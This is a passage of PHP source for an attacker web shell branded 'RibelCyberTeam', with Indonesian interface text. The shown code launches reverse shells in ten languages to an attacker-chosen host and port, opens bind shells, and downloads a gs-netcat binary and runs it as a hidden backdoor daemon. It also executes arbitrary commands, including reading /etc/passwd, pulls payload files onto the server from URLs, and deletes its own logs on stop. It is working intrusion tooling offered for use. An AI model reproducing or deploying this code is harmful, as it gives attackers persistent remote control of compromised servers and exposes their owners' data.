                @curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
                @curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                @curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                @curl_setopt($ch, CURLOPT_TIMEOUT, 30);
                @curl_setopt($ch, CURLOPT_USERAGENT, 'curl/7.68');
                $b = @curl_exec($ch); @curl_close($ch);
                if ($b && strlen($b) > 100000) { $blob = $b; break; }
            }
        }
        if (!$blob && @ini_get('allow_url_fopen')) {
            $ctx = @stream_context_create(array(
                'http' => array('timeout' => 30, 'follow_location' => 1, 'user_agent' => 'curl/7.68'),
                'ssl'  => array('verify_peer' => false, 'verify_peer_name' => false),
            ));
            $b = @file_get_contents($u, false, $ctx);
            if ($b && strlen($b) > 100000) { $blob = $b; break; }
        }
    }
    if (!$blob) return false;
    @file_put_contents($gs_bin, $blob);
    @chmod($gs_bin, 0755);
    return gs_present();
}
function gs_get_secret() {
    global $gs_secret;
    if (@is_file($gs_secret)) {
        $s = trim(@file_get_contents($gs_secret));
        if ($s !== '') return $s;
    }
    if (!@is_dir(dirname($gs_secret))) return '';
    $s = rhex(32);
    @file_put_contents($gs_secret, $s);
    @chmod($gs_secret, 0600);
    return $s;
}

/* ============================================================
   ADDITION: Shell actions
   ============================================================ */
$sh_msg = '';

if (isset($_POST['shell_action'])) {
    $sa = $_POST['shell_action'];

    if ($sa === 'start_reverse') {
        ensure_dir($sh_dir);
        $lh     = isset($_POST['lhost']) ? trim($_POST['lhost']) : '';
        $lp     = isset($_POST['lport']) ? (int)$_POST['lport'] : 0;
        $method = isset($_POST['method']) ? $_POST['method'] : 'auto';

        if ($lh === '' || $lp < 1 || $lp > 65535) {
            $sh_msg = 'LHOST / LPORT tidak valid.';
        } else {
            $nc = which_bin('nc') ? which_bin('nc') : which_bin('ncat');
            $c  = null;

            if ($method === 'python3') {
                $py = "import socket,subprocess,os;s=socket.socket();s.connect(('$lh',$lp));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/sh','-i'])";
                $c = "python3 -c " . escapeshellarg($py) . " 2>>" . escapeshellarg($sh_err);
            } elseif ($method === 'python') {
                $py = "import socket,subprocess,os;s=socket.socket();s.connect(('$lh',$lp));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/sh','-i'])";
                $c = "python -c " . escapeshellarg($py) . " 2>>" . escapeshellarg($sh_err);
            } elseif ($method === 'bash') {
                $c = "bash -c 'bash -i >& /dev/tcp/$lh/$lp 0>&1' 2>>" . escapeshellarg($sh_err);
            } elseif ($method === 'nc') {
                $ncb = $nc ? $nc : 'nc';
                $c = "$ncb $lh $lp -e /bin/sh 2>>" . escapeshellarg($sh_err);
            } elseif ($method === 'perl') {
                $c = "perl -e 'use Socket;\$i=\"$lh\";\$p=$lp;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};' 2>>" . escapeshellarg($sh_err);
            } elseif ($method === 'php') {
                $c = "php -r '\$sock=fsockopen(\"$lh\",$lp);exec(\"/bin/sh -i <&3 >&3 2>&3\");' 2>>" . escapeshellarg($sh_err);
            } elseif ($method === 'ruby') {
                $c = "ruby -rsocket -e 'f=TCPSocket.open(\"$lh\",$lp).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)' 2>>" . escapeshellarg($sh_err);
            } elseif ($method === 'socat') {
                $c = "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:$lh:$lp 2>>" . escapeshellarg($sh_err);
            } elseif ($method === 'node') {
                $js = "(function(){var net=require('net'),cp=require('child_process'),sh=cp.spawn('/bin/sh',[]);var c=new net.Socket();c.connect($lp,'$lh',function(){c.pipe(sh.stdin);sh.stdout.pipe(c);sh.stderr.pipe(c);});return /a/;})()";
                $c = "node -e " . escapeshellarg($js) . " 2>>" . escapeshellarg($sh_err);
            } elseif ($method === 'powershell') {
                $ps = "\$c=New-Object System.Net.Sockets.TCPClient('$lh',$lp);\$s=\$c.GetStream();[byte[]]\$b=0..65535|%{0};while((\$i=\$s.Read(\$b,0,\$b.Length)) -ne 0){\$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$b,0,\$i);\$sb=(iex \$d 2>&1|Out-String);\$sb2=\$sb+'PS '+(pwd).Path+'> ';\$sx=([text.encoding]::ASCII).GetBytes(\$sb2);\$s.Write(\$sx,0,\$sx.Length);\$s.Flush()};\$c.Close()";
                $c = "powershell -NoP -NonI -W Hidden -Exec Bypass -Command " . escapeshellarg($ps);
            } else {
                $py3 = which_bin('python3');
                $py  = which_bin('python');
                $ba  = which_bin('bash');
                $pe  = which_bin('perl');
                if ($py3) {
                    $code = "import socket,subprocess,os;s=socket.socket();s.connect(('$lh',$lp));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/sh','-i'])";
                    $c = "$py3 -c " . escapeshellarg($code) . " 2>>" . escapeshellarg($sh_err);
                } elseif ($py) {
                    $code = "import socket,subprocess,os;s=socket.socket();s.connect(('$lh',$lp));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/sh','-i'])";
                    $c = "$py -c " . escapeshellarg($code) . " 2>>" . escapeshellarg($sh_err);
                } elseif ($ba) {
                    $c = "$ba -c 'bash -i >& /dev/tcp/$lh/$lp 0>&1' 2>>" . escapeshellarg($sh_err);
                } elseif ($nc) {
                    $c = "$nc $lh $lp -e /bin/sh 2>>" . escapeshellarg($sh_err);
                } elseif ($pe) {
                    $c = "$pe -e 'use Socket;\$i=\"$lh\";\$p=$lp;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};' 2>>" . escapeshellarg($sh_err);
                } else {
                    $c = "rm -f /tmp/.rct_f; mkfifo /tmp/.rct_f; cat /tmp/.rct_f | /bin/sh -i 2>&1 | nc $lh $lp > /tmp/.rct_f";
                }
            }

            $run = "setsid sh -c " . escapeshellarg($c . " >" . $sh_log . " 2>&1") . " >/dev/null 2>&1 & echo \$!";
            @exec($run, $o);
            $pid = isset($o[0]) ? (int)trim($o[0]) : 0;
            if ($pid > 0) {
                @file_put_contents($sh_pid, $pid);
                $sh_msg = "Reverse shell ke $lh:$lp [$method] dijalankan. PID: $pid";
            } else {
                $sh_msg = "Reverse shell [$method] dijalankan (PID tidak terdeteksi).";
            }
        }
    }

    if ($sa === 'start_bind') {
        ensure_dir($sh_dir);
        $bp     = isset($_POST['bport']) ? (int)$_POST['bport'] : 0;
        $method = isset($_POST['bmethod']) ? $_POST['bmethod'] : 'auto';

        if ($bp < 1 || $bp > 65535) {
            $sh_msg = 'Bind port tidak valid.';
        } else {
            $nc = which_bin('nc') ? which_bin('nc') : which_bin('ncat');
            $c  = null;

            if ($method === 'ncat') {
                $nc2 = which_bin('ncat');
                if (!$nc2) $sh_msg = 'ncat tidak ada.';
                else $c = "$nc2 -lvnp $bp -e /bin/sh 2>>" . escapeshellarg($sh_err);
            } elseif ($method === 'nc') {
                if (!$nc) $sh_msg = 'nc tidak ada.';
                else $c = "$nc -lvnp $bp -e /bin/sh 2>>" . escapeshellarg($sh_err);
            } elseif ($method === 'socat') {
                $sc = which_bin('socat');
                if (!$sc) $sh_msg = 'socat tidak ada.';
                else $c = "$sc TCP-LISTEN:$bp,reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid,sigint,sane 2>>" . escapeshellarg($sh_err);
            } elseif ($method === 'python') {
                $py = which_bin('python3') ? which_bin('python3') : which_bin('python');
                if (!$py) $sh_msg = 'python tidak ada.';
                else {
                    $code = "import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1);s.bind(('0.0.0.0',$bp));s.listen(1);c,a=s.accept();[os.dup2(c.fileno(),f) for f in (0,1,2)];pty.spawn('/bin/bash')";
                    $c = "$py -c " . escapeshellarg($code) . " 2>>" . escapeshellarg($sh_err);
                }
            } else {
                if (!$nc) $sh_msg = 'nc / ncat tidak ada.';
                elseif (strpos($nc, 'ncat') !== false) $c = "$nc -lvnp $bp -e /bin/sh 2>>" . escapeshellarg($sh_err);
                else $c = "rm -f /tmp/.rct_b; mkfifo /tmp/.rct_b; cat /tmp/.rct_b | /bin/sh -i 2>&1 | $nc -lvnp $bp > /tmp/.rct_b";
            }

            if ($c) {
                $run = "setsid sh -c " . escapeshellarg($c . " >" . $sh_log . " 2>&1") . " >/dev/null 2>&1 & echo \$!";
                @exec($run, $o);
                $pid = isset($o[0]) ? (int)trim($o[0]) : 0;
                if ($pid > 0) {
                    @file_put_contents($sh_pid, $pid);
                    $sh_msg = "Bind shell listening di port $bp [$method]. PID: $pid";
                } else {
                    $sh_msg = "Bind shell [$method] dijalankan.";
                }
            }
        }
    }

    if ($sa === 'stop_shell') {
        ensure_dir($sh_dir);
        $pid = @is_file($sh_pid) ? (int)@file_get_contents($sh_pid) : 0;
        kill_pid($pid);
        pkill_f('nc -e /bin/sh');
        pkill_f('bash -i');
        pkill_f('nc -lvnp');
        pkill_f('python3 -c import socket');
        pkill_f('socat TCP-LISTEN');
        @unlink($sh_pid);
        @unlink($sh_log);
        @unlink($sh_err);
        @rmdir($sh_dir);
        $sh_msg = 'Shell dihentikan.';
    }

    if ($sa === 'gs_download') {
        ensure_dir($gs_dir);
        if (gs_present()) $sh_msg = 'gs-netcat sudah ada.';
        elseif (gs_download_bin()) $sh_msg = 'gs-netcat diunduh (' . gs_arch() . ').';
        else $sh_msg = 'Gagal unduh. Upload manual ke .rct_gsocket/gs-netcat.';
    }

    if ($sa === 'gs_start') {
        ensure_dir($gs_dir);
        if (!gs_present()) {
            $sh_msg = 'gs-netcat tidak ada. Klik Download dulu.';
        } else {
            $shell_path = '';
            foreach (array('/bin/bash','/usr/bin/bash','/bin/sh','/usr/bin/sh','/bin/ash') as $c) {
                if (@is_executable($c)) { $shell_path = $c; break; }
            }
            if ($shell_path === '') {
                $sh_msg = 'Tidak ada shell (/bin/bash, /bin/sh) di server.';
            } else {
                $secret = gs_get_secret();
                $bin    = gs_bin_path();
                $c      = escapeshellarg($bin) . " -l -s " . escapeshellarg($secret) . " -i -e " . escapeshellarg($shell_path . ' -il');
                $run    = "setsid sh -c " . escapeshellarg($c . " >" . $gs_log . " 2>&1") . " >/dev/null 2>&1 & echo \$!";
                @exec($run, $o);
                $pid = isset($o[0]) ? (int)trim($o[0]) : 0;
                if ($pid > 0) {
                    @file_put_contents($gs_pid, $pid);
                    $sh_msg = "GSocket daemon jalan. PID: $pid\nSecret: $secret\nShell: $shell_path";
                } else {
                    $sh_msg = "GSocket dijalankan. Secret: $secret\nShell: $shell_path";
                }
            }
        }
    }

    if ($sa === 'gs_stop') {
        ensure_dir($gs_dir);
        $pid = @is_file($gs_pid) ? (int)@file_get_contents($gs_pid) : 0;
        kill_pid($pid);
        pkill_f('gs-netcat');
        @unlink($gs_pid);
        @unlink($gs_log);
        @rmdir($gs_dir);
        $sh_msg = 'GSocket daemon dihentikan.';
    }

    if ($sa === 'gs_rotate') {
        ensure_dir($gs_dir);
        @unlink($gs_secret);
        $new = gs_get_secret();
        $sh_msg = "Secret baru: $new\nRestart daemon agar berlaku.";
    }
}

/* ============================================================
   ADDITION: Poll endpoints
   ============================================================ */
if (isset($_GET['shell_poll'])) {
    header('Content-Type: text/plain; charset=utf-8');
    $o = @is_file($sh_log) ? @file_get_contents($sh_log) : '';
    $e = @is_file($sh_err) ? @file_get_contents($sh_err) : '';
    $p = @is_file($sh_pid) ? (int)@file_get_contents($sh_pid) : 0;
    echo "[pid] " . ($p ? $p : 'none') . "\n";
    echo "[alive] " . (pid_alive($p) ? 'yes' : 'no') . "\n";
    echo "--- stdout ---\n" . ($o ? $o : '(empty)') . "\n";
    echo "--- stderr ---\n" . ($e ? $e : '(empty)') . "\n";
    exit;
}

if (isset($_GET['gs_poll'])) {
    header('Content-Type: text/plain; charset=utf-8');
    $p = @is_file($gs_pid) ? (int)@file_get_contents($gs_pid) : 0;
    $s = @is_file($gs_secret) ? trim(@file_get_contents($gs_secret)) : '(belum dibuat)';
    $l = @is_file($gs_log) ? @file_get_contents($gs_log) : '(kosong)';
    $cmd = ($s !== '(belum dibuat)' && $s !== '') ? "gs-netcat -s $s -i" : '(no secret)';
    echo "[pid] " . ($p ? $p : 'none') . "\n";
    echo "[alive] " . (pid_alive($p) ? 'yes' : 'no') . "\n";
    echo "[arch] " . (gs_arch() ? gs_arch() : 'unknown') . "\n";
    echo "[binary] " . (gs_present() ? 'present' : 'missing') . "\n";
    echo "[secret] $s\n";
    echo "[command] $cmd\n";
    echo "--- log ---\n$l\n";
    exit;
}

if (isset($_GET['stats'])) {
    header('Content-Type: application/json; charset=utf-8');
    header('Cache-Control: no-store, no-cache, must-revalidate');

    $u = @file_get_contents('/proc/uptime');
    $up = 0;
    if ($u) { $a = explode(' ', $u); $up = (int)$a[0]; }

    $m = @file_get_contents('/proc/meminfo');
    $mt = $ma = 0;
    if ($m) {
        if (preg_match('/MemTotal:\s+(\d+)/', $m, $x)) $mt = (int)$x[1];
        if (preg_match('/MemAvailable:\s+(\d+)/', $m, $x)) $ma = (int)$x[1];
    }

    $df = @disk_free_space(__DIR__);
    $dt = @disk_total_space(__DIR__);
    $load = @file_get_contents('/proc/loadavg');
    $load = $load ? trim($load) : '-';

    echo json_encode(array(
        'uptime'    => $up,
        'uptime_h'  => $up ? floor($up/3600).'h '.floor(($up%3600)/60).'m '.($up%60).'s' : '-',
        'mem_total' => $mt,
        'mem_avail' => $ma,
        'mem_pct'   => $mt > 0 ? round(($mt - $ma) / $mt * 100, 1) : 0,
        'mem_used'  => $mt > 0 ? ($mt - $ma) : 0,
        'disk_free' => $df,
        'disk_total'=> $dt,
        'disk_pct'  => ($dt > 0 && $df !== false) ? round(($dt - $df) / $dt * 100, 1) : 0,
        'load'      => $load,
        'ts'        => time(),
    ));
    exit;
}
?>
<!DOCTYPE html>
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<title>root@RibelCyberTeam:~#</title>
<link rel="icon" href="https://cdn.shellbypass.com/images/img1.jpg" type="image/png">
<style type="text/css">
body{
    margin:0;padding:0;
    background:#0f1117;
    color:#d6d6d6;
    font-family:Tahoma,Arial,sans-serif;
    font-size:12px;
}
.top{
    background:#151922;
    border-bottom:1px solid #2a3140;
    padding:14px;
}
.title{
    font-size:18px;
    color:#fff;
    font-weight:bold;
}
.muted{color:#8e99ab;}
.path{
    color:#7ee787;
    font-weight:bold;
}
.wrap{padding:14px;}
.box{
    background:#151922;
    border:1px solid #2a3140;
    padding:12px;
    margin-bottom:12px;
    border-radius:8px;
}
.path a{
    color:#7ee787;
    text-decoration:none;
}
.path a:hover{
    text-decoration:underline;
}
.path{
    color:#7ee787;
    font-weight:bold;
}
.quick a, .quick form{
    display:inline;
}
.quick .btn{
    padding:2px 6px;
    font-size:10px;
}
.perm-green{
    color:#7ee787;
    font-weight:bold;
}
.perm-white{
    color:#c9d1d9;
    font-weight:bold;
}
.msg{
    background:#1b2330;
    border:1px solid #3b4a63;
    color:#9ed0ff;
    padding:10px;
    margin-bottom:12px;
    border-radius:8px;
}
input[type=text], textarea, input[type=file]{
    width:100%;
    box-sizing:border-box;
    background:#0f1117;
    color:#e6edf3;
    border:1px solid #30363d;
    padding:7px;
    border-radius:6px;
    font-size:12px;
}
textarea{
    height:450px;
    font-family:Consolas,monospace;
}
table{
    width:100%;
    border-collapse:collapse;
}
th,td{
    border:1px solid #2a3140;
    padding:8px;
    vertical-align:top;
}
th{
    background:#1b2330;
    color:#fff;
}
tr:hover td{
    background:#111723;
}
a{
    color:#79c0ff;
    text-decoration:none;
}
a:hover{
    text-decoration:underline;
}
.btn{
    display:inline-block;
    background:#212936;
    color:#fff;
    border:1px solid #38465c;
    padding:4px 8px;
    font-size:11px;
    border-radius:5px;
    text-decoration:none;
    cursor:pointer;
}
.btn:hover{
    background:#2a3444;
    text-decoration:none;
}
.btn-red{
    background:#3a1f24;
    border-color:#69323b;
}
.btn-green{
    background:#1f3527;
    border-color:#355d42;
}
.btn-yellow{
    background:#3a341f;
    border-color:#6a5f34;
}
.actions a,.actions form{
    display:inline;
}
.small-input{
    width:60px !important;
    display:inline;
}
.name{
    color:#e6edf3;
    font-weight:bold;
}
.dir{
    color:#e6edf3;
    font-weight:bold;
}
.file{
    color:#e6edf3;
}
.grid td{
    width:33%;
}
.hoverbox{
    position:relative;
    display:inline-block;
}
.previewbox{
    display:none;
    position:absolute;
    left:160px;
    top:0;
    z-index:9999;
    background:#0f1117;
    border:1px solid #38465c;
    padding:6px;
    border-radius:8px;
    box-shadow:0 4px 16px rgba(0,0,0,0.45);
    min-width:80px;
}
.previewbox img{
    display:block;
    max-width:220px;
    max-height:220px;
    border-radius:4px;
}
.hoverbox:hover .previewbox{
    display:block;
}
td{
    overflow:visible;
}
.hoverbox{
    position:relative;
    display:inline-block;
}
.previewbox{
    display:none;
    position:absolute;
    left:160px;
    top:0;
    z-index:9999;
    background:#0f1117;
    border:1px solid #38465c;
    padding:8px;
    border-radius:8px;
    box-shadow:0 4px 16px rgba(0,0,0,0.45);
    min-width:180px;
    max-width:260px;
}
.previewbox img{
    display:block;
    max-width:220px;
    max-height:220px;
    border-radius:6px;
    margin-bottom:8px;
}
.hoverbox:hover .previewbox{
    display:block;
}
.miniinfo{
    font-size:11px;
    line-height:1.5;
    color:#c9d1d9;
}
.miniinfo b{
    color:#ffffff;
}
.miniinfo .row{
    margin-bottom:2px;
}
td:first-child{
    white-space:normal;
}
td, table, .box{
    overflow:visible;
}
table, .box{
    overflow:visible;
}
pre{
    white-space:pre-wrap;
    word-wrap:break-word;
    overflow:auto;
}
.cmd-row{
    display:flex;
    gap:10px;
    margin-top:10px;
}
.cmd-row input{
    flex:1;
    font-family:Consolas,monospace;
}
.quick-cmds{
    display:flex;
    flex-wrap:wrap;
    gap:6px;
    margin-top:10px;
}
.quick-cmds button{
    padding:3px 8px;
    font-size:10px;
}
.tabs{
    display:flex;
    gap:8px;
    flex-wrap:wrap;
    margin-top:10px;
}
.tabs .btn.active{
    background:#20304d;
    border-color:#4d70b5;
    color:#dce6ff;
}
.tab-body{display:block;}
.out{
    background:#0a0e14;
    border:1px solid #2a3140;
    border-radius:6px;
    padding:10px;
    color:#7ee787;
    font-family:Consolas,monospace;
    font-size:11px;
    max-height:280px;
    overflow:auto;
    margin-top:10px;
    white-space:pre-wrap;
}
.form-grid{
    display:grid;
    grid-template-columns:1fr 1fr;
    gap:12px;
    margin-top:10px;
}
.form-grid .full{grid-column:1 / -1;}
.form-grid select,
.form-grid input[type=text]{
    margin-bottom:6px;
}
.shell-list{display:grid;gap:6px;}
.hint{
    font-size:11px;
    color:#8e99ab;
    margin-top:4px;
}
.gs-cmd-row{
    display:flex;
    gap:6px;
    margin-top:6px;
}
.gs-cmd-row input{
    font-family:Consolas,monospace;
    font-size:11px;
}
.btn-blue{
    background:#1f2d40;
    border-color:#3a4f6e;
}
</style>
</head>
<body>
<div class="top">
    <div class="title">root@RibelCyberTeam:~#</div>
    <div class="muted" style="margin-top:6px;">
        Server: <b><?php echo h($server_name); ?></b> |
        Host: <?php echo h($hostname); ?> |
        IP Srv: <?php echo h($ip_server); ?> |
        IP You: <?php echo h($ip_remote); ?><br>
        OS: <?php echo h($uname); ?><br>
        PHP: <?php echo h(phpversion()); ?> |
        User: <?php echo h($self_user); ?> |
        Software: <?php echo h($server_software); ?><br>
        DocRoot: <?php echo h($doc_root); ?><br>
        Uptime: <span id="stat-uptime"><?php echo h($uptime_h); ?></span> |
        CPU: <?php echo h($cores); ?> core |
        Load: <span id="stat-load">-</span><br>
        RAM: <span style="color:#7ee787;" id="stat-ram"><?php echo h(format_size($mem_avail*1024)); ?></span>
            / <span id="stat-ram-total"><?php echo h(format_size($mem_total*1024)); ?></span>
            <span id="stat-ram-pct" style="color:#8e99ab;">(-)</span> free<br>
        Disk: <span style="color:#7ee787;" id="stat-disk"><?php echo h(format_size($disk_free)); ?></span>
            / <span id="stat-disk-total"><?php echo h(format_size($disk_total)); ?></span>
            <span id="stat-disk-pct" style="color:#8e99ab;">(-)</span> free<br>
        safe_mode: <span style="color:<?php echo $safe_mode ? '#ff7b72' : '#7ee787'; ?>;"><?php echo h($safe_mode ?: 'off'); ?></span> |
        open_basedir: <span style="color:<?php echo $open_basedir ? '#ff7b72' : '#7ee787'; ?>;"><?php echo h($open_basedir ?: 'off'); ?></span><br>
        TimeZone: <?php echo h($timezone); ?><br>
        Disabled: <span style="color:#ff7b72; word-wrap:break-word;"><?php echo h($disabled ?: 'none'); ?></span><br>
        Path: <span class="path"><?php echo breadcrumb_path($cwd_real); ?></span>
        <a href="?"><strong>[ HOME ]</strong></a> ~|~
        <a href="?logout=1" style="color:#ff7b72;"><strong>[ Logout ]</strong></a>
    </div>
</div>
<div class="wrap">
<?php if ($msg != '') { ?>
<div class="msg"><?php echo $msg; ?></div>
<?php } ?>
<?php if (isset($sh_msg) && $sh_msg != '') { ?>
<div class="msg"><?php echo h($sh_msg); ?></div>
<?php } ?>
<div class="box">
    <div class="tabs">
        <a class="btn <?php echo $tab === 'shell' ? 'active' : ''; ?>" href="?<?php echo $tab === 'shell' ? '' : 'tab=shell&'; ?>path=<?php echo urlencode($cwd_real); ?>"><?php echo $tab === 'shell' ? '&#9662;' : '&#9656;'; ?> Shell - Reverse / Bind</a>
        <a class="btn <?php echo $tab === 'gs' ? 'active' : ''; ?>" href="?<?php echo $tab === 'gs' ? '' : 'tab=gs&'; ?>path=<?php echo urlencode($cwd_real); ?>"><?php echo $tab === 'gs' ? '&#9662;' : '&#9656;'; ?> GSocket</a>
        <a class="btn <?php echo $tab === 'cmd' ? 'active' : ''; ?>" href="?<?php echo $tab === 'cmd' ? '' : 'tab=cmd&'; ?>path=<?php echo urlencode($cwd_real); ?>"><?php echo $tab === 'cmd' ? '&#9662;' : '&#9656;'; ?> Command Execution</a>
        <a class="btn <?php echo $tab === 'info' ? 'active' : ''; ?>" href="?<?php echo $tab === 'info' ? '' : 'tab=info&'; ?>path=<?php echo urlencode($cwd_real); ?>"><?php echo $tab === 'info' ? '&#9662;' : '&#9656;'; ?> Function Check</a>
        <a class="btn <?php echo $tab === 'upurl' ? 'active' : ''; ?>" href="?<?php echo $tab === 'upurl' ? '' : 'tab=upurl&'; ?>path=<?php echo urlencode($cwd_real); ?>"><?php echo $tab === 'upurl' ? '&#9662;' : '&#9656;'; ?> Upload URL</a>
    </div>
</div>
<?php if ($tab === 'info'): ?>
<div class="box">
    <div class="name">Function &amp; Binary Check</div>
    <table style="margin-top:10px;">
        <?php
        $half = ceil(count($crit)/2);
        $keys = array_keys($crit);
        for ($i = 0; $i < $half; $i++) {
            echo '<tr>';
            foreach (array($keys[$i], isset($keys[$i+$half]) ? $keys[$i+$half] : null) as $k) {
                if ($k === null) { echo '<td></td>'; continue; }
                $ok = $crit[$k];
                echo '<td>' . h($k) . ': <span style="color:' . ($ok ? '#7ee787' : '#ff7b72') . ';font-weight:bold;">' . ($ok ? 'OK' : 'NO') . '</span></td>';
            }
            echo '</tr>';
        }
        ?>
    </table>
</div>
<?php endif; ?>
<?php if ($tab === 'upurl'): ?>
<div class="box">
    <div class="name">Upload from URL</div>
    <div class="muted" style="margin:8px 0 12px 0;">
        Fetch file dari URL langsung ke <b><?php echo h($cwd_real); ?></b>.
    </div>
    <form method="post" style="margin-top:8px;">
        <input type="hidden" name="action" value="upload_url">
        <input type="hidden" name="path" value="<?php echo h($cwd_real); ?>">
        <div style="margin-bottom:8px;">
            <div class="muted" style="margin-bottom:4px;">URL:</div>
            <input type="text" name="url" placeholder="https://raw.githubusercontent.com/user/repo/main/payload.php" autocomplete="off">
        </div>
        <div style="margin-bottom:8px;">
            <div class="muted" style="margin-bottom:4px;">Simpan sebagai:</div>
            <input type="text" name="urlname" placeholder="payload.php" autocomplete="off">
        </div>
        <div style="margin-top:10px;">
            <input type="submit" class="btn btn-green" value="Fetch &amp; Save">
            <a class="btn" href="?tab=upurl&path=<?php echo urlencode($cwd_real); ?>">Reset</a>
        </div>
    </form>
    <div class="hint" style="margin-top:12px;">
        Tips: upload file di github dan salin url raw.githubusercontent.com.
    </div>
</div>
<?php endif; ?>
<?php if ($tab === 'shell'): ?>
<div class="box">
    <div class="name">Shell - Reverse/Bind</div>
    <div class="form-grid">
        <div>
            <div class="muted"><b>Reverse Shell</b> - server connect to pc</div>
            <form method="post" style="margin-top:8px;">
                <input type="hidden" name="shell_action" value="start_reverse">
                <select name="method">
                    <option value="auto">Auto-detect (python3 → python → bash → nc → perl)</option>
                    <option value="python3">Python 3</option>
                    <option value="python">Python 2</option>
                    <option value="bash">Bash /dev/tcp</option>
                    <option value="nc">Netcat -e</option>
                    <option value="perl">Perl</option>
                    <option value="php">PHP</option>
                    <option value="ruby">Ruby</option>
                    <option value="socat">Socat</option>
                    <option value="node">Node.js</option>
                    <option value="powershell">PowerShell (Windows)</option>
                </select>
                <input type="text" name="lhost" placeholder="LHOST (IP publik kamu)">
                <input type="text" name="lport" placeholder="LPORT (mis. 4444)">
                <div style="margin-top:6px;"><input type="submit" class="btn btn-green" value="Start Reverse"></div>
            </form>
        </div>
        <div>
            <div class="muted"><b>Bind Shell</b> - pc connect to server</div>
            <form method="post" style="margin-top:8px;">
                <input type="hidden" name="shell_action" value="start_bind">
                <select name="bmethod">
                    <option value="auto">Auto-detect (ncat → nc fifo)</option>
                    <option value="ncat">ncat -e</option>
                    <option value="nc">nc -e</option>
                    <option value="socat">Socat</option>
                    <option value="python">Python pty</option>
                </select>
                <input type="text" name="bport" placeholder="Bind port (mis. 4444)">
                <div style="margin-top:6px;"><input type="submit" class="btn btn-green" value="Start Bind"></div>
            </form>
        </div>
    </div>
    <div style="margin-top:14px; display:flex; gap:8px; align-items:center; flex-wrap:wrap;">
        <form method="post" style="display:inline;">
            <input type="hidden" name="shell_action" value="stop_shell">
            <input type="submit" class="btn btn-red" value="Stop Shell">
        </form>
        <a class="btn" href="#" onclick="rctPoll();return false;">Refresh Output</a>
        <span class="muted" id="rct-status">idle</span>
    </div>
    <pre id="rct-out" class="out">(belum ada output - klik Refresh Output)</pre>
</div>
<?php endif; ?>
<?php if ($tab === 'gs'): ?>
<div class="box">
    <div class="name">GSocket</div>
    <div class="muted" style="margin:8px 0 12px 0;">
        gs netcat server to pc.
    </div>
    <div style="display:flex; gap:8px; flex-wrap:wrap;">
        <form method="post" style="display:inline;">
            <input type="hidden" name="shell_action" value="gs_download">
            <input type="submit" class="btn" value="1. Download gs-netcat">
        </form>
        <form method="post" style="display:inline;">
            <input type="hidden" name="shell_action" value="gs_start">
            <input type="submit" class="btn btn-green" value="2. Start Daemon">
        </form>
        <form method="post" style="display:inline;">
            <input type="hidden" name="shell_action" value="gs_stop">
            <input type="submit" class="btn btn-red" value="Stop">
        </form>
        <form method="post" style="display:inline;">
            <input type="hidden" name="shell_action" value="gs_rotate">
            <input type="submit" class="btn btn-yellow" value="Rotate Secret">
        </form>
        <a class="btn" href="#" onclick="gsPoll();return false;">Refresh</a>
        <span class="muted" id="gs-status">idle</span>
    </div>
    <div style="margin-top:12px;">
        <div class="muted" style="margin-bottom:4px;">Command:</div>
        <div class="gs-cmd-row">
            <input type="text" id="gs-cmd" readonly value="">
            <button type="button" class="btn" onclick="copyGsCmd()">Copy</button>
        </div>
    </div>
    <pre id="gs-out" class="out" style="color:#79c0ff; max-height:220px;">(klik Refresh)</pre>
</div>
<?php endif; ?>
<?php if ($tab === 'cmd'): ?>
<div class="box">
    <div class="name">Command Execution</div>
    <form method="post">
        <div class="cmd-row">
            <input type="text" name="cmd" id="cmd" placeholder="Enter command (e.g., whoami, id, ls -la)" autocomplete="off">
            <input type="submit" name="run_cmd" class="btn btn-green" value="Execute">
        </div>
        <div class="quick-cmds">
            <button type="button" class="btn" onclick="setCmd('whoami')">whoami</button>
            <button type="button" class="btn" onclick="setCmd('id')">id</button>
            <button type="button" class="btn" onclick="setCmd('uname -a')">uname -a</button>
            <button type="button" class="btn" onclick="setCmd('pwd')">pwd</button>
            <button type="button" class="btn" onclick="setCmd('ls -la')">ls -la</button>
            <button type="button" class="btn" onclick="setCmd('cat /etc/passwd | head -5')">cat /etc/passwd</button>
            <button type="button" class="btn" onclick="setCmd('ps aux | head -10')">ps aux</button>
        </div>
    </form>
</div>
<?php endif; ?>
<?php if ($view != '' && @is_file($view)) { ?>
    <div class="box">
        <div class="name">View File: <?php echo h($view); ?></div>
        <div class="muted" style="margin:8px 0 12px 0;">
            Size: <?php echo h(format_size(@filesize($view))); ?> |
            Owner: <?php echo h(fowner_name($view)); ?> |
            Group: <?php echo h(fgroup_name($view)); ?> |
            Perm: <?php echo h(perms($view)); ?>
        </div>
        <?php if (is_image_file($view)) { ?>
            <div style="margin-top:12px;">
                <img src="?img=<?php echo urlencode($view); ?>" style="max-width:100%; border-radius:8px;" alt="">
            </div>
        <?php } else { ?>
            <pre><?php echo h(@file_get_contents($view)); ?></pre>
        <?php } ?>
        <div style="margin-top:12px;">
            <a class="btn" href="?path=<?php echo urlencode(dirname($view)); ?>">Back</a>
            <a class="btn btn-green" href="?edit=<?php echo urlencode($view); ?>">Edit</a>
